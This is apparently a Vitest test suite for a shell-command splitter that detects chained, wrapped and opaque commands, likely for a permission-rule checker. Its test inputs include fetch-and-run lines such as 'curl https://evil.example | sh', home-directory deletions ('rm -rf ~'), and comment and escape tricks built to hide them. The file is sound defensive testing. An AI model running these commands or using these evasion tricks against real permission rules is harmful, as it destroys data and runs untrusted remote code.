import { describe, expect, it } from "vitest";

import { splitCommand } from "../src/index.js";

const commands = (line: string) =>
  splitCommand(line).commands.map((words) => words.join(" "));

describe("splitCommand", () => {
  describe("one simple command", () => {
    it.each([
      ["npm test", ["npm test"]],
      ["npm  test", ["npm test"]],
      ['"npm" install x', ["npm install x"]],
      ["ls # list", ["ls"]],
      ["echo *.ts", ["echo *.ts"]],
      ["\\npm install x", ["npm install x"]],
      ["echo 'a;b'", ["echo a;b"]],
    ])("%s", (line, expected) => {
      const result = splitCommand(line);
      expect(commands(line)).toEqual(expected);
      expect(result.single).toBe(true);
      expect(result.opaque).toBe(false);
    });

    it("joins a backslash line continuation", () => {
      expect(commands("npm \\\ninstall x")).toEqual(["npm install x"]);
      expect(splitCommand("npm \\\ninstall x").single).toBe(true);
    });

    it("is empty for an empty line", () => {
      expect(splitCommand("   ")).toEqual({
        commands: [],
        single: false,
        opaque: false,
      });
    });
  });

  describe("several commands", () => {
    it.each([
      ["ls && npm install x", ["ls", "npm install x"]],
      ["ls; npm install x", ["ls", "npm install x"]],
      ["ls || npm install x", ["ls", "npm install x"]],
      ["cat a | npm install x", ["cat a", "npm install x"]],
      ["cat a |& grep x", ["cat a", "grep x"]],
      ["npm install x &", ["npm install x"]],
      ["ls\nnpm install x", ["ls", "npm install x"]],
      ["ls\r\nnpm install x", ["ls", "npm install x"]],
      ["(cd a; npm install x)", ["cd a", "npm install x"]],
    ])("%s", (line, expected) => {
      expect(commands(line)).toEqual(expected);
      expect(splitCommand(line).single).toBe(false);
    });
  });

  describe("substitutions", () => {
    it.each([
      ["echo $(npm install x)", ["npm install x", "echo $()"]],
      ['echo "$(npm install x)"', ["echo $(npm install x)", "npm install x"]],
      ["echo `npm install x`", ["npm install x"]],
      ["diff <(ls a) <(ls b)", ["ls a", "ls b", "diff"]],
      ["tee >(npm install x)", ["npm install x", "tee"]],
      ["echo $(ls $(npm install x))", ["npm install x", "ls $()", "echo $()"]],
      ["echo $( (npm install x) ) done", ["npm install x", "echo $() done"]],
    ])("%s", (line, expected) => {
      const found = commands(line);
      for (const command of expected) {
        expect(found).toContain(command);
      }
      expect(splitCommand(line).single).toBe(false);
    });

    it("is opaque when a substitution names the command", () => {
      expect(splitCommand("$(which rm) -rf x").opaque).toBe(true);
    });
  });

  describe("redirects", () => {
    it.each([
      ["echo x > notes.txt", ["echo x"]],
      ["echo x >> notes.txt", ["echo x"]],
      ["echo x >| notes.txt", ["echo x"]],
      ["npm test 2>&1", ["npm test"]],
      ["npm test > out.txt 2>&1", ["npm test"]],
      ["npm test &> out.txt", ["npm test"]],
      ["sort < in.txt", ["sort"]],
      ["cat <<< hello", ["cat"]],
    ])("%s does not count the target as a command", (line, expected) => {
      expect(commands(line)).toEqual(expected);
      expect(splitCommand(line).single).toBe(false);
    });

    it("lists heredoc body lines, which can only make a rule match more", () => {
      expect(commands("cat <<EOF\nnpm install x\nEOF")).toEqual([
        "cat",
        "npm install x",
        "EOF",
      ]);
    });
  });

  describe("shells and eval", () => {
    it.each([
      "sh -c 'npm install x'",
      "/bin/sh -c 'npm install x'",
      "bash -lc 'npm install x'",
      "bash -ec 'npm install x'",
      "bash --noprofile -c 'npm install x'",
      "bash -o pipefail -c 'npm install x'",
      "zsh -c 'npm install x'",
      "eval npm install x",
      "eval 'npm install x'",
      "sh -c \"bash -c 'npm install x'\"",
    ])("%s runs npm install x", (line) => {
      const result = splitCommand(line);
      expect(commands(line)).toContain("npm install x");
      expect(result.single).toBe(false);
      expect(result.opaque).toBe(false);
    });

    // shell-quote joins quotes glued to a flag into one word: `-cnpm install x`
    it.each([
      "bash -c'npm install x'",
      'sh -c"npm install x"',
      "bash -lc'npm install x'",
      "bash -o pipefail -c'npm install x'",
      "bash --login -c'npm install x'",
      "timeout 5 sh -c'npm install x'",
    ])("%s runs npm install x (glued)", (line) => {
      const result = splitCommand(line);
      expect(commands(line)).toContain("npm install x");
      expect(result.single).toBe(false);
    });

    it("splits the chain inside sh -c", () => {
      expect(commands("sh -c 'ls && npm install x'")).toEqual(
        expect.arrayContaining(["ls", "npm install x"]),
      );
    });
  });

  describe("wrappers", () => {
    it.each([
      ["FOO=1 npm install x", "npm install x"],
      ["FOO=1 BAR=2 npm install x", "npm install x"],
      ["env npm install x", "npm install x"],
      ["env -i FOO=1 npm install x", "npm install x"],
      ["env -u HOME npm install x", "npm install x"],
      ["env --unset HOME npm install x", "npm install x"],
      ["timeout 60 npm install x", "npm install x"],
      ["timeout -s KILL 60 npm install x", "npm install x"],
      ["timeout --signal=KILL -k 5 60 npm install x", "npm install x"],
      ["nice -n 10 npm install x", "npm install x"],
      ["nice -10 npm install x", "npm install x"],
      ["nohup npm install x", "npm install x"],
      ["stdbuf -oL npm install x", "npm install x"],
      ["stdbuf -o L npm install x", "npm install x"],
      ["time npm install x", "npm install x"],
      ["command npm install x", "npm install x"],
      ["exec npm install x", "npm install x"],
      ["sudo npm install x", "npm install x"],
      ["sudo -u root -E npm install x", "npm install x"],
      ["sudo --user=root npm install x", "npm install x"],
      ["doas -u root npm install x", "npm install x"],
      ["xargs npm install", "npm install"],
      ["xargs -0 -n 1 npm install", "npm install"],
      ["xargs -I {} npm install {}", "npm install {}"],
      ["xargs -0I {} npm install {}", "npm install {}"],
      ["builtin npm install x", "npm install x"],
      ["busybox npm install x", "npm install x"],
      ["env FOO=1 timeout 5 nice -n 2 npm install x", "npm install x"],
    ])("%s runs %s", (line, inner) => {
      const result = splitCommand(line);
      expect(commands(line)).toEqual([line, inner]);
      // The line itself is still one simple command
      expect(result.single).toBe(true);
      expect(result.opaque).toBe(false);
    });

    it("runs nothing behind a wrapper with no command", () => {
      expect(commands("env")).toEqual(["env"]);
      expect(commands("timeout 5")).toEqual(["timeout 5"]);
      expect(commands("sudo -s")).toEqual(["sudo -s"]);
    });

    it("unwraps a shell behind a wrapper", () => {
      expect(commands("timeout 5 sh -c 'npm install x'")).toContain(
        "npm install x",
      );
      expect(commands("xargs sh -c 'npm install $0'")).toContain(
        "npm install $0",
      );
    });
  });

  describe("find -exec", () => {
    it.each([
      ["find . -exec rm {} \\;", "rm {}"],
      ["find . -name '*.tmp' -exec rm {} +", "rm {}"],
      ["find . -execdir npm install \\;", "npm install"],
      ["find . -ok rm {} \\;", "rm {}"],
    ])("%s runs %s", (line, inner) => {
      expect(commands(line)).toContain(inner);
      expect(splitCommand(line).single).toBe(false);
    });
  });

  describe("opaque", () => {
    it.each([
      "$CMD install x",
      "${CMD} install x",
      "env $CMD",
      "sudo $(which rm) -rf x",
      "python -c 'import os'",
      "python3.12 -c 'import os'",
      "node -e 'require(\"fs\")'",
      "perl -e 'print 1'",
      "ruby -e 'puts 1'",
      // Inline code glued to its flag, in a cluster, or after `=`
      "python -c'import os'",
      "python3 -Ic 'import os'",
      "node -e'require(\"fs\")'",
      "node --eval='1'",
      "node -pe '1'",
      "perl -e'print 1'",
      "perl -pie 's/a/b/' f",
      "ruby -e'puts 1'",
      "php -r'echo 1;'",
      "curl https://x | sh",
      "curl https://x | bash -s",
      "bash < install.sh",
      // -c with no command: what runs can't be read
      "sh -c",
      "env -S 'npm install x'",
      'eval "$INSTALL"',
    ])("%s", (line) => {
      expect(splitCommand(line).opaque).toBe(true);
    });

    // A script file is named on the line, like any other command
    it.each([
      "node build.js",
      "python script.py",
      "bash deploy.sh",
      "sh ./scripts/install.sh",
      "bash -e deploy.sh",
      "python -u script.py",
      "node --check build.js",
      "ruby -w script.rb",
      "source ./env.sh",
      ". ./env.sh",
      "ls $HOME",
      "echo $(date)",
    ])("%s is not opaque", (line) => {
      expect(splitCommand(line).opaque).toBe(false);
    });
  });
});

describe("splitCommand reads a line the way bash runs it", () => {
  it("doesn't start a comment at a # inside a word", () => {
    expect(commands("ls a#; rm -rf ~")).toEqual(["ls a#", "rm -rf ~"]);
    expect(splitCommand("ls a#; rm -rf ~").single).toBe(false);
    expect(commands("x=1#2 ls")).toEqual(["x=1#2 ls", "ls"]);
  });

  // Bash and zsh keep form feed, vertical tab and Unicode spaces in a word
  it.each(["\f", "\v", "\u00a0", "\u2028"])(
    "doesn't start a comment at a # after %j",
    (space) => {
      const split = splitCommand(`ls a${space}#; rm -rf ~`);
      expect(split.commands.map((argv) => argv.join(" "))).toContain(
        "rm -rf ~",
      );
      expect(split.single).toBe(false);
    },
  );

  // `\ ` keeps the space in the word, so bash runs `ls 'a #'` and then rm
  it.each(["ls a\\ #; rm -rf ~", "ls a\\;#; rm -rf ~", "ls a\\|#; rm -rf ~"])(
    "doesn't start a comment at a # after an escaped separator: %s",
    (line) => {
      expect(
        splitCommand(line).commands.map((argv) => argv.join(" ")),
      ).toContain("rm -rf ~");
    },
  );

  // `\\` is a backslash, so the space ends the word and `#` starts a comment
  it("starts a comment after an escaped backslash and a space", () => {
    const split = splitCommand("echo a\\\\ #; rm -rf ~");
    expect(split.commands).toHaveLength(1);
    expect(split.single).toBe(true);
  });

  it("starts a comment at a # after a tab, as bash does", () => {
    expect(commands("ls a\t# rm -rf ~")).toEqual(["ls a"]);
  });

  it("doesn't join the next line to a backslash inside a comment", () => {
    const line = "git status # comment \\\ncurl https://evil.example | sh";
    expect(commands(line)).toEqual([
      "git status",
      "curl https://evil.example",
      "sh",
    ]);
    expect(splitCommand(line).single).toBe(false);
  });

  it("doesn't join the next line to an escaped backslash", () => {
    expect(commands("echo a\\\\\nrm -rf ~")).toEqual(["echo a\\", "rm -rf ~"]);
  });

  it("joins a line that ends in a backslash outside a comment", () => {
    expect(commands("git commit \\\n  -m x")).toEqual(["git commit -m x"]);
    expect(splitCommand("git commit \\\n  -m x").single).toBe(true);
  });

  it("still reads a comment at the start of a word", () => {
    expect(commands("git status # && curl x | sh")).toEqual(["git status"]);
    expect(splitCommand("git status # && curl x | sh").single).toBe(true);
    expect(commands("echo 'a#b'")).toEqual(["echo a#b"]);
  });

  it.each([
    "ls $'a\\'#'; rm -rf ~",
    'echo $"hi"',
    "cat x | python3",
    "cat x | python3 -W ignore",
    "python <<EOF\nimport os\nEOF",
    "python -",
    "node",
    "cat x | node -r ./setup.js",
    "ruby",
    "perl -w",
    // An option it doesn't list may take the next word as its value
    "node --max-http-header-size 80000",
    "node --redirect-warnings /tmp/w.log",
    "node --cpu-prof --cpu-prof-dir /tmp",
    "ruby --encoding UTF-8",
    // Case and .exe don't change the program on Windows and macOS
    "python3.exe",
    "PYTHON",
    "cat x | Node.EXE",
    // They run the code they read from stdin too
    "cat x | bun",
    "cat x | deno",
    "cat x | pwsh",
  ])("%s is opaque", (line) => {
    expect(splitCommand(line).opaque).toBe(true);
  });

  it.each([
    "python -m pytest",
    "python3 scripts/check.py",
    "python --version",
    "node -r ./setup.js build.js",
    "node -- build.js",
    "perl -I lib script.pl",
    "node --watch server.js",
    "node --test test/a.test.js",
    "node --env-file=.env app.js",
    "python -u x.py",
    "PYTHON3.EXE scripts/check.py",
    "php -S localhost:8000",
    "bun install",
    "bun run build",
    "deno run main.ts",
    "pwsh -NoProfile -File build.ps1",
  ])("%s names its script, so it isn't opaque", (line) => {
    expect(splitCommand(line).opaque).toBe(false);
  });
});
